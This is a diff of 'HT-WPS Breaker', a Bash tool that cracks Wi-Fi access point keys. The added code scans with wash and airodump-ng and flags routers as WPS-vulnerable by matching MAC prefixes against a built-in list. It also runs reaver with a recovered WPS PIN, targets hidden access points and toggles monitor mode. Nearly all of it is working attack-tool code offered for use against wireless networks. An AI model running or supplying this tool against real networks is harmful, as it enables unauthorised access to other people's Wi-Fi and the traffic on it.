@@ -641,16 +845,6 @@ SELECT_CAPTURE_CRACK() {
 						          echo -e -n "$White            [+] Select$BRed one$White thing from the menu :"
 						          read back
 						   done
-						   done
-						   if [ "$back" == "1" ]
-						        then
-								    re=yes
-						   elif [ "$back" == "2" ]
-						        then
-								    re=no
-						   fi
-						   rm -rf airmon-ng pixiewps.txt
-						   rm -rf capture
 }
 Vun_MAC[0]="C4:39:3A"
 Vun_MAC[1]="62:6B:D3"
@@ -753,11 +947,13 @@ sleep 0.1
 echo -e "$Yellow     +${White}-------------------------------------------------------------------${Yellow}+"
 echo -e "${White}     | ${Yellow} ID ${White} |                   ${BPurple}   Name                             ${White}     |"
 echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
-echo -e "${White}     | ${Red}[${Yellow}01${Red}]${White} |$Green Attack automatically${White}.${White}                                      |"
-echo -e "${White}     | ${Red}[${Yellow}02${Red}]${White} |$Green Manuel input${White}.${White}                                              |"
-echo -e "${White}     | ${Red}[${Yellow}03${Red}]${White} |$Green If you want to crack an acces point's key with$BRed WPS PIN${White}.${White}    |"
-echo -e "${White}     | ${Red}[${Yellow}04${Red}]${White} |$Green If you want to crack a$BRed Hidden$Green acces point${White}.${White}                 |"
-echo -e "${White}     | ${Red}[${Yellow}05${Red}]${White} |$Green Exit${White}.${White}                                                      |"
+echo -e "${White}     | ${Red}[${Yellow}01${Red}]${White} |$Green Attack automatically with${Cyan} Wash${White}.${White}                            |"
+echo -e "${White}     | ${Red}[${Yellow}02${Red}]${White} |$Green Attack automatically with${Cyan} Airodump-ng${White}.${White}                     |"
+echo -e "${White}     | ${Red}[${Yellow}03${Red}]${White} |$Green Manuel input${White}.${White}                                              |"
+echo -e "${White}     | ${Red}[${Yellow}04${Red}]${White} |$Green If you want to crack an acces point's key with$BRed WPS PIN${White}.${White}    |"
+echo -e "${White}     | ${Red}[${Yellow}05${Red}]${White} |$Green If you want to crack a$BRed Hidden$Green acces point${White}.${White}                 |"
+echo -e "${White}     | ${Red}[${Yellow}06${Red}]${White} |$Green ${Green}Enable${White} or ${Red}Disable${White} The${Cyan} Monitor Mode${White}.${White}                        |"
+echo -e "${White}     | ${Red}[${Yellow}07${Red}]${White} |$Green Exit${White}.${White}                                                      |"
 echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
 echo ""
 echo -e -n "$White    ${Red} [${Cyan}!${Red}]$White Type the$BRed ID$White of your choice : "
@@ -765,6 +961,174 @@ read menu
 menu=`expr $menu + 0 2> /dev/null`
 case $menu in
              "1")
+			     Ver_Pckg_Tools
+				 Ver_Mon_WCar_Fun
+                 if [ "$VerMon" != "" ]
+                      then
+                           Ver_Mon_Fun
+						   trap kill_wash SIGINT
+						   wash -i $mon -C -o wash.txt > /dev/null &
+						   WashID="$!"
+						   disown $WashID
+						   for ((c=0; c<=3; c++))
+						         do
+						           echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when ready,good luck"
+								   sleep 1
+						   done
+						   back=0
+						   fin=0
+						   num_wireless=-1
+						   while [ "$back" == "0" ]
+						   do
+						     clear
+							 echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
+						     echo -e "${Red} |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BGreen green$White this mean that device is vulnerable.${Red}                  |"
+							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BYellow yellow$White this mean that device is may be vulnerable or aren't.${Red}|"
+							 echo -e " |${Red} [${Yellow}+${Red}]${White} If the BSSID in$BRed red$White this mean the wps of that device is Locked.$Red             |"
+							 echo -e "${White} +${Red}---------------------------------------------------------------------------------${White}+"
+						     echo -e ${Yellow}"  ID	${BWhite}BSSID                  CH       PWR     WPS Locked   Ver    ESSID"
+						     echo -e $Purple" ~~~~   ~~~~~                  ~~       ~~~     ~~~~~~~~~~   ~~~    ~~~~~"
+						     i=0
+							 Quit=0
+							 NL=1
+							 count_rot=0
+							 while [ $Quit == 0 ]
+								 do
+								   cat wash.txt | sed '1,2d' > wash_nf.txt
+								   line=`cat wash_nf.txt | sed -n ${NL}p 2> /dev/null`
+								   if [ "$line" != "" ]
+								      then
+								   v=0
+								   MAC=`echo $line | awk -F' ' '{print $1}'`
+								   CHANNEL=`echo $line | awk -F' ' '{print $2}'`
+								   POWER=`echo $line | awk -F' ' '{print $3}'`
+								   WPS_VERSION=`echo $line | awk -F' ' '{print $4}'`
+								   WPS_LOCKED=`echo $line | awk -F' ' '{print $5}'`
+								   ESSID=`echo $line | cut -d' ' -f6-`
+								   length=${#MAC}
+		                           if [ $length -ge 17 ]; then
+			                            i=$(($i+1))
+										if [ $i != 0 ]; then
+										     d=1
+										else
+										     d=0
+									    fi
+			                            POWER=`expr $POWER + 100`
+										Ver_vun=`echo $MAC | cut -c 1-8`
+										if [ "$WPS_LOCKED" == "No" ]
+										    then
+											    WPS_LOCKED="  No  "
+										else
+										        WPS_LOCKED="Locked"
+										fi
+			                            if [ "$i" -lt "10" ]
+			                            	then
+			                            	    echo -e -n " ${Red}[${Yellow}0"$i"${Red}]\t"
+			                            else
+			                            	echo -e -n " ${Red}[${Yellow}"$i"${Red}]\t"
+			                            fi
+										for (( c=0; c<=66; c++))
+										    do
+											  if [ "$Ver_vun" == "${Vun_MAC[$c]}" ]
+											       then
+												       v=1
+											  fi
+									    done
+										if [ "$WPS_LOCKED" == "Locked" ]
+										    then
+											    echo -e -n $BRed"$MAC\t"
+										elif [ "$v" == 1 ]
+										    then
+											    echo -e -n $BGreen"$MAC      "
+									    else
+								    		    echo -e -n $BYellow"$MAC      "
+										fi
+										if [ "$CHANNEL" -ge 10 ]
+										    then
+										        echo -e -n $BWhite"$CHANNEL\t"
+										else
+										        echo -e -n $BWhite"0$CHANNEL\t"
+										fi
+										if [ $POWER -ge 40 ]
+										     then
+										         echo -e -n $Green"$POWER%\t"
+										elif [ $POWER -ge 30 ]
+										     then
+											     echo -e -n $Yellow"$POWER%\t"
+										else
+										         echo -e -n $Red"$POWER%\t"
+										fi
+										if [ "$WPS_LOCKED" == "  No  " ]
+										   then
+										       echo -e -n $Green"  $WPS_LOCKED"
+										else
+										       echo -e -n $Red"  $WPS_LOCKED"
+									    fi
+										echo -e -n $Green"     $WPS_VERSION"
+										echo -e $BWhite"    $ESSID\t"
+			                            IDLENGTH=$IDLENGTH
+			                            ESSID[$i]=$ESSID
+			                            CHANNEL[$i]=$CHANNEL
+			                            BSSID[$i]=$MAC
+			                            SPEED[$i]=$SPEED
+		                            fi
+									NL=$(($NL+1))
+									fi
+									sleep 0.1
+									if [ "$fin" -eq 1 ]
+									   then
+									       count_rot=$(($count_rot+1))
+									fi
+									if [ "$count_rot" -eq "$num_wireless" ]
+									    then
+										    Quit=1
+								    fi
+								 done < <( cat wash_nf.txt 2> /dev/null )
+						   num_wireless=$i
+						   fin=1
+						   trap exit_function SIGINT
+						   echo ""
+						   echo ""
+						   V_number=0
+						   while [ "$V_number" != "1" ]
+									        do
+											  echo -en "\033[1A\033[2K"
+						                      echo -n -e "${White}  [+]$Blue Select the ${Red}ID${Blue} of your target from$White [${Green}${d}-${i}$White] : "
+						                      read  N_OB
+											  if [[ "$N_OB" =~ ^[+-]?[0-9]+$ ]]
+											      then
+											         if [ "$N_OB" -ge "$d" ] && [ "$N_OB" -le "$i" ]
+											  	        then
+											                V_number=1
+											         else
+											                V_number=0
+											         fi
+											  else
+											         V_number=0
+											  fi
+						   done
+						   echo ""
+						   idlenght=${IDLENGTH[$N_OB]}
+						   ESSID=${ESSID[$N_OB]}
+						   CHANNEL=$(echo ${CHANNEL[$N_OB]}|tr -d [:space:])
+						   BSSID=${BSSID[$N_OB]}
+						   PRIVACY=${PRIVACY[$N_OB]}
+						   SPEED=${SPEED[$N_OB]}
+						   ESSID="$(echo $ESSID)"
+						   CRACKING_PROCESS
+						   done
+						   if [ "$back" == "1" ]
+						        then
+								    re=yes
+						   elif [ "$back" == "2" ]
+						        then
+								    re=no
+						   fi
+						   rm -rf airmon-ng pixiewps.txt
+						   rm -rf capture
+                 fi
+			     ;;
+             "2")
 			     Ver_Pckg_Tools
 				 Ver_Mon_WCar_Fun
                  if [ "$VerMon" != "" ]
@@ -791,7 +1155,7 @@ case $menu in
 						   SELECT_CAPTURE_CRACK
                  fi
                  ;;
-			"2")
+			"3")
 			    airmon-ng > .airmon-ng.txt
                   VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                   VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
@@ -854,16 +1218,16 @@ case $menu in
 															        echo ""
 															        echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
 															        echo ""
-															        reaver -i $mon -b $BSSID -c $CHANNEL -vv -n -p $PIN
+															        reaver -i $mon -b $BSSID -c $CHANNEL -vvv -n -L -P -p $PIN
 															        echo -e "$Yellow [+]$Green Congratulation (^_^) "
 															        echo ""
 													        fi
 									              else
-												       cat ${BSSID}.txt | head -n 7 | tail -n 5
+									              	   cd PIN
+												       cat ${BSSID}.txt | head -n 7 | tail -n 5 2> /dev/null
 									                   echo ""
 										               echo -e "$Red [!]$White Sorry pin not found,good luck next time."
 												       echo ""
-												       cd PIN;
 													   rm -rf ${BSSID}.txt
 												       cd ..
 									               fi
@@ -873,7 +1237,7 @@ case $menu in
 				            fi
 				    fi
 				    ;;			
-			"3")
+			"4")
 				  airmon-ng > .airmon-ng.txt
                   VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                   VerCar=`iwconfig 2>&1 | grep '802.11' | wc -l`
@@ -915,7 +1279,7 @@ case $menu in
 						   
 				fi
 				;;
-			  "4")
+			  "5")
                  Ver_Pckg_Tools
 				 Ver_Mon_WCar_Fun
                  if [ "$VerMon" != "" ]
@@ -1020,10 +1384,16 @@ case $menu in
 											  echo -en "\033[1A\033[2K"
 						                      echo -n -e "${White}  [+]${Blue} Select the ${Red}ID${Blue} of your target from$White [${Green}${d}-${i}$White] : "
 						                      read  N_OB
-											  if [ $N_OB -ge $d ] && [ $N_OB -le $i ]; then
-											       V_number=1
+											  if [[ "$N_OB" =~ ^[+-]?[0-9]+$ ]]
+											      then
+											         if [ "$N_OB" -ge "$d" ] && [ "$N_OB" -le "$i" ]
+											  	        then
+											                V_number=1
+											         else
+											                V_number=0
+											         fi
 											  else
-											       V_number=0
+											         V_number=0
 											  fi
 						   done
 						   echo ""
@@ -1047,52 +1417,160 @@ case $menu in
 						   SELECT_CAPTURE_CRACK
 				fi
                   ;;
-			  "5")
+              "6")
+                  for (( i = 0; i <= 9; i++ ))
+                     do
+                       sleep 0.2
+                       echo -en "\033[1A\033[2K"
+                  done
+                  echo -e "${White}     | ${Red}[${Yellow}01${Red}]${White} |$Green Enable ${White}The ${Cyan}Monitor Mode ${White}.${White}                                  |"
+                  sleep 0.2
+                  echo -e "${White}     | ${Red}[${Yellow}02${Red}]${White} |$Red Disable ${White}The ${Cyan}Monitor Mode ${White}.${White}                                 |"
+                  sleep 0.2
+                  echo -e "${White}     | ${Red}[${Yellow}03${Red}]${White} |$Green Back to menu ${White}.${White}                                             |"
+                  sleep 0.2
+                  echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
+                  echo ""
+                  echo -e -n "$White    ${Red} [${Cyan}!${Red}]$White Type the$BRed ID$White of your choice : "
+                  read ID
+                  ID=`expr $ID + 0 2> /dev/null`
+                  case $ID in
+                               "1")
+                                   airmon-ng > .airmon-ng.txt
+                                   VerMon=""
+                                   VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
+                                   Ver_Mon_WCar_Fun
+                                   mode_monitor=no
+                                   ;;
+							   "2")
+							       airmon-ng > .airmon-ng.txt
+						           cou_mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
+						           if [ $cou_mon -ge 1 ]
+						                then
+								            Ver_aircrack_ng=`aircrack-ng | grep -w "1.2 rc2"`
+						                    Num_Mon=`iwconfig 2>&1 | grep 'Mode:Monitor' | wc -l`
+								            echo -e "[+] We found$Green $cou_mon$White monitor mode."
+									        echo ""
+						                    echo -e $Yellow" +${White}----${Yellow}+${White}--------------------------------------${Yellow}+"
+						                    echo -e " ${White}| ${Yellow}ID${White} |   ${BRed}Interface     ${Yellow}|$Cyan     Chipset        ${White}|"
+						                    echo -e " ${Yellow}+${White}----${Yellow}+${White}--------------------------------------${Yellow}+"
+						                    for (( c=1; c<=$Num_Mon; c++))
+       						                    do
+										            m[$c]=`iwconfig 2>&1 | grep 'Mode:Monitor' | awk '{print $1}' | sed -n ${c}'p'`
+										            if [ "$Ver_aircrack_ng" != "" ]
+                           	                           then
+                           	                               Interface=`cat .airmon-ng.txt | grep ${m[$c]} | cut -f2`
+                           	                               Chipset=`cat .airmon-ng.txt | grep ${m[$c]} | rev | cut -f1 | rev`
+                           	                               if [ "$cou_mon" -lt "10" ]
+                           	             	                  then
+                           	                                      echo -e "  ${Red}[${Yellow}0$c${Red}]$White   $Interface           $Chipset"
+                           	                               else
+                           	             	                      echo -e "  ${Red}[${Green}$c${Red}]$White   $Interface           $Chipset"
+                           	                               fi
+                           	                        else
+                           	                	           airmon-zc > .airmon-zc.txt
+	     						                           Interface=`cat .airmon-zc.txt | grep ${m[$c]} | cut -f2`
+                           	                               Chipset=`cat .airmon-zc.txt | grep ${m[$c]} | rev | cut -f1 | rev`
+                           	                               if [ "$cou_mon" -lt "10" ]
+                           	             	                  then
+                           	                                      echo -e "  ${Red}[${Yellow}0$c${Red}]$White   $Interface           $Chipset"
+                           	                               else
+                           	             	                   echo -e "  ${Red}[${Green}$c${Red}]$White   $Interface           $Chipset"
+                           	                               fi
+	     						                    fi
+						                    done
+									        echo ""
+									        echo ""
+									        while [ "$V_number" != "1" ]
+									                do
+											          echo -en "\033[1A\033[2K"
+						                              echo -e -n "\r${White}[+] select$Red number$White of interface in order to${Red} Disable${White} it from [${Green}1-$Num_Mon$White]:$Green"
+						                              read number
+											          if [[ "$number" =~ ^[+-]?[0-9]+$ ]]
+									                     then
+											                 if [ $number -ge 1 ] && [ $number -le $Num_Mon ]; then
+											                     V_number=1
+														         mon=${m[$number]}
+											                 else
+											                     V_number=0
+											                 fi
+											          else
+											                     V_number=0
+											          fi
+								            done
+											echo ""
+											trap kill_load SIGINT
+											airmon-ng stop $mon > /dev/null &
+						                    PID="$!"
+						                    Wait_Msg="Disabling${Cyan} Monitor Mode${White} on$Green $mon $White."
+						                    End_Msg="${Cyan}Monitor Mode${White}$White is${Red} Disable ."
+						                    Loading
+						                    trap - SIGINT SIGQUIT SIGTSTP
+											sleep 1
+								   else
+								            echo "" 
+                            	            sleep 0.5
+                            	            echo -e $White" [${Red}!${White}] Is no${Cyan} Monitor Mode${White} to${Red} Disable${White} ."
+                            	            echo ""
+                            	            sleep 0.5
+						           fi
+						           rm -rf .airmon-ng.txt
+							       ;;
+								"3")
+								    re="yes"
+								    ;;
+								"*")
+								    echo ""
+			                        echo -e "$White     [${Red}!${White}]$Red Input${White} out of range."
+			                        echo ""
+								    ;;
+                  esac
+                  ;;
+			  "7")
+                  echo ""
+                  echo -e "$White[${Green} ok ${White}]$Green HT-WPS Breaker$White By$BYellow Silent Ghost X."
                   echo ""
 			      exit
 			      ;;
 			  *)
 			   echo ""
-			   echo -e "$BRed     [!]$BWhite Input out of range."
+			   echo -e "$White     [${Red}!${White}]$Red Input${White} out of range."
 			   echo ""
 			   ;;
 esac
 echo ""
-echo -e "$White [${Green}ok${White}]$Green HT-WPS Breaker$White By$BYellow Silent Ghost X."
+echo -e "$White     [${Green} ok ${White}]$Green HT-WPS Breaker$White By$BYellow Silent Ghost X."
 echo ""
-if [ "$re" != "yes" ]
-	 then
-	     trap "" SIGINT
-         echo -e "$Red [!]$White Remove any temporary file."
-         rm -rf capture empty.txt Reaver.txt .airmon-ng.txt Ver_Reaver.txt .airmon-zc.txt
-         sleep 1
-         echo ""
-         if [ "$mode_monitor" == "active" ]
-         	then
-         	    echo -e "$White [${Red}!${White}]$BRed Stop$White the ${Green}Monitor Mode$White."
-         	    airmon-ng stop $mon > /dev/null
-         	    echo ""
-         fi
-         echo -e "$White [+]$Green Greetz to ${White}: ${Cyan}AKAS${White} ."
-         echo ""
-         echo -e "             ${Green}########################################################"
-         sleep 0.1
-         echo -e "             ##                ${Yellow}{Full Information}${Green}                  ##"
-         sleep 0.1
-         echo -e "             ##   ${Cyan}-Author   ${White}:      {${Yellow} Silent Ghost ${White}}                ${Green}##"
-         sleep 0.1
-         echo -e "             ##   ${Cyan}-Country  ${White}:      {${Red} Morocco ${White}}                     ${Green}##"
-         sleep 0.1
-         echo -e "             ##   ${Cyan}-Email    ${White}:      {${Purple} silent-ghostx@outlook.com ${White}}   ${Green}##"
-         sleep 0.1
-         echo -e "             ########################################################"
-         sleep 0.1
-         echo ""
-fi
    while [ "$re" != 'Y' ] && [ "$re" != 'y' ] && [ "$re" != 'Yes' ] && [ "$re" != 'YES' ] && [ "$re" != 'yes' ] && [ "$re" != 'N' ] && [ "$re" != 'n' ] && [ "$re" != 'No' ] && [ "$re" != 'NO' ] && [ "$re" != 'no' ] && [ "$re" != 'O' ] && [ "$re" != 'o' ] && [ "$re" != 'Oui' ] && [ "$re" != 'OUI' ] && [ "$re" != 'oui' ] && [ "$re" != "\n" ]
          do
            echo -n -e "$Red\r                 [+]$White Try again (${BGreen}Y${White})es or (${BGreen}N${White})o :$BGreen "
            read re
 		   echo -en "\033[1A\033[2K"
    done
-done 
+done
+trap "" SIGINT
+echo -e "$White [${Red}!${White}] Remove any temporary file."
+rm -rf capture empty.txt Reaver.txt .airmon-ng.txt Ver_Reaver.txt .airmon-zc.txt wash_nf.txt wash.txt Get_Pass.txt
+sleep 1
+echo ""
+if [ "$mode_monitor" == "active" ]
+    then
+        echo -e "$White [${Red}!${White}]$Red Stop$White the ${Green}Monitor Mode$White."
+        airmon-ng stop $mon > /dev/null
+        echo ""
+fi
+echo -e "$White [+]$Green Greetz to ${White}: ${Cyan}AKAS${White} ."
+echo ""
+echo -e "             ${Green}########################################################"
+sleep 0.1
+echo -e "             ##                ${Yellow}{Full Information}${Green}                  ##"
+sleep 0.1
+echo -e "             ##   ${Cyan}-Author   ${White}:      {${Yellow} Silent Ghost ${White}}                ${Green}##"
+sleep 0.1
+echo -e "             ##   ${Cyan}-Country  ${White}:      {${Red} Morocco ${White}}                     ${Green}##"
+sleep 0.1
+echo -e "             ##   ${Cyan}-Email    ${White}:      {${Purple} silent-ghostx@outlook.com ${White}}   ${Green}##"
+sleep 0.1
+echo -e "             ########################################################"
+sleep 0.1
+echo ""
